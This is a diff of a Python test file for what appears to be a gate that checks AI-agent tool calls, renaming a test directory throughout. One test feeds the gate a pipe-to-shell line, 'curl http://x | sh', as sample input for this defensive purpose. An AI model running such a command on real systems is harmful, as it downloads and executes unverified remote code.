@@ -57,7 +57,7 @@ def _write_prompt(path, uuid, text="hi"):
 
 
 def test_gate_writes_header_call_and_verdict(tmp_path):
-    root = tmp_path / "gate"
+    root = tmp_path / "gate-root"
     register_envelope(starter_envelope(tmp_path), root=root)
     gate_and_contract(
         json.dumps(_payload(tmp_path, "curl http://x | sh")).encode(), root=root, mode="enforce"
@@ -79,7 +79,7 @@ def test_gate_writes_header_call_and_verdict(tmp_path):
 
 
 def test_second_call_appends_to_the_same_tree(tmp_path):
-    root = tmp_path / "gate"
+    root = tmp_path / "gate-root"
     register_envelope(starter_envelope(tmp_path), root=root)
     for _ in range(2):
         gate_and_contract(json.dumps(_payload(tmp_path)).encode(), root=root, mode="audit")
@@ -88,7 +88,7 @@ def test_second_call_appends_to_the_same_tree(tmp_path):
 
 
 def test_tree_failure_never_changes_the_verdict(tmp_path, monkeypatch):
-    root = tmp_path / "gate"
+    root = tmp_path / "gate-root"
     register_envelope(starter_envelope(tmp_path), root=root)
 
     def _boom(*_a, **_k):
@@ -113,7 +113,7 @@ def test_tree_failure_never_changes_the_verdict(tmp_path, monkeypatch):
 
 
 def test_no_payload_writes_nothing(tmp_path):
-    root = tmp_path / "gate"
+    root = tmp_path / "gate-root"
     gate_and_contract(b"not json", root=root, mode="enforce")
     assert not (tmp_path / "sessions").exists()
 
@@ -126,7 +126,7 @@ def test_checkpoints_off_by_default_writes_no_checkpoint_entry(tmp_path):
     _init_repo(ws)
     transcript = tmp_path / "t.jsonl"
     _write_prompt(transcript, "u1")
-    root = tmp_path / "gate"
+    root = tmp_path / "gate-root"
     register_envelope(starter_envelope(ws), root=root)
     payload = _payload(tmp_path, cwd=ws, transcript=transcript)
     gate_and_contract(
@@ -141,7 +141,7 @@ def test_checkpoints_flag_writes_one_per_new_prompt_and_stores_coversCount_not_c
     _init_repo(ws)
     transcript = tmp_path / "t.jsonl"
     _write_prompt(transcript, "u1")
-    root = tmp_path / "gate"
+    root = tmp_path / "gate-root"
     register_envelope(starter_envelope(ws), root=root)
     payload = _payload(tmp_path, cwd=ws, transcript=transcript)
     for _ in range(2):  # two calls under the same prompt: only one checkpoint
@@ -173,7 +173,7 @@ def test_checkpoint_skipped_list_is_capped_by_bytes_not_just_count(tmp_path, mon
     _init_repo(ws)
     transcript = tmp_path / "t.jsonl"
     _write_prompt(transcript, "u1")
-    root = tmp_path / "gate"
+    root = tmp_path / "gate-root"
     register_envelope(starter_envelope(ws), root=root)
     payload = _payload(tmp_path, cwd=ws, transcript=transcript)
 
@@ -209,7 +209,7 @@ def test_checkpoint_skipped_list_with_a_modest_count_is_kept_whole(tmp_path, mon
     _init_repo(ws)
     transcript = tmp_path / "t.jsonl"
     _write_prompt(transcript, "u1")
-    root = tmp_path / "gate"
+    root = tmp_path / "gate-root"
     register_envelope(starter_envelope(ws), root=root)
     payload = _payload(tmp_path, cwd=ws, transcript=transcript)
 
@@ -239,7 +239,7 @@ def test_checkpoint_failure_never_changes_the_verdict(tmp_path, monkeypatch):
     _init_repo(ws)
     transcript = tmp_path / "t.jsonl"
     _write_prompt(transcript, "u1")
-    root = tmp_path / "gate"
+    root = tmp_path / "gate-root"
     register_envelope(starter_envelope(ws), root=root)
     payload = _payload(tmp_path, cwd=ws, transcript=transcript)
 
@@ -271,7 +271,7 @@ def _clear_pane_env(monkeypatch):
 
 
 def test_state_entry_pane_prefers_coppice_pane_over_every_other_var(tmp_path, monkeypatch):
-    root = tmp_path / "gate"
+    root = tmp_path / "gate-root"
     register_envelope(starter_envelope(tmp_path), root=root)
     _clear_pane_env(monkeypatch)
     monkeypatch.setenv("COPPICE_PANE", "c1")
@@ -282,7 +282,7 @@ def test_state_entry_pane_prefers_coppice_pane_over_every_other_var(tmp_path, mo
 
 
 def test_state_entry_pane_falls_back_to_herdr_pane_id(tmp_path, monkeypatch):
-    root = tmp_path / "gate"
+    root = tmp_path / "gate-root"
     register_envelope(starter_envelope(tmp_path), root=root)
     _clear_pane_env(monkeypatch)
     monkeypatch.setenv("HERDR_PANE_ID", "h1")
@@ -292,7 +292,7 @@ def test_state_entry_pane_falls_back_to_herdr_pane_id(tmp_path, monkeypatch):
 
 
 def test_state_entry_pane_falls_back_to_herdr_pane(tmp_path, monkeypatch):
-    root = tmp_path / "gate"
+    root = tmp_path / "gate-root"
     register_envelope(starter_envelope(tmp_path), root=root)
     _clear_pane_env(monkeypatch)
     monkeypatch.setenv("HERDR_PANE", "h2")
@@ -301,7 +301,7 @@ def test_state_entry_pane_falls_back_to_herdr_pane(tmp_path, monkeypatch):
 
 
 def test_state_entry_pane_falls_back_to_tmux_pane(tmp_path, monkeypatch):
-    root = tmp_path / "gate"
+    root = tmp_path / "gate-root"
     register_envelope(starter_envelope(tmp_path), root=root)
     _clear_pane_env(monkeypatch)
     monkeypatch.setenv("TMUX_PANE", "%3")
@@ -309,7 +309,7 @@ def test_state_entry_pane_falls_back_to_tmux_pane(tmp_path, monkeypatch):
 
 
 def test_state_entry_pane_is_none_when_no_env_var_is_set(tmp_path, monkeypatch):
-    root = tmp_path / "gate"
+    root = tmp_path / "gate-root"
     register_envelope(starter_envelope(tmp_path), root=root)
     _clear_pane_env(monkeypatch)
     assert _state_pane(tmp_path, root) is None
@@ -323,7 +323,7 @@ def _decision():
 
 
 def test_report_blocked_never_leaks_a_non_string_harness_session_id(tmp_path):
-    root = tmp_path / "gate"
+    root = tmp_path / "gate-root"
     payload = {"session_id": 42, "cwd": str(tmp_path)}
     _report_blocked(
         root,
@@ -340,7 +340,7 @@ def test_report_blocked_never_leaks_a_non_string_harness_session_id(tmp_path):
 
 
 def test_maybe_report_state_never_leaks_a_non_string_harness_session_id(tmp_path):
-    root = tmp_path / "gate"
+    root = tmp_path / "gate-root"
     payload = {"session_id": 42, "cwd": str(tmp_path)}
     _maybe_report_state(root, payload, _decision(), session_id=None, fmt="claude", tree=None)
     tree = SessionTree.open(root.parent / "sessions", "42")
@@ -349,7 +349,7 @@ def test_maybe_report_state_never_leaks_a_non_string_harness_session_id(tmp_path
 
 
 def test_log_tree_never_leaks_a_non_string_harness_session_id(tmp_path):
-    root = tmp_path / "gate"
+    root = tmp_path / "gate-root"
     payload = {"session_id": 42, "cwd": str(tmp_path), "tool_use_id": "t1"}
     _log_tree(root, payload, _decision(), session_id=None, fmt="claude")
     tree = SessionTree.open(root.parent / "sessions", "42")
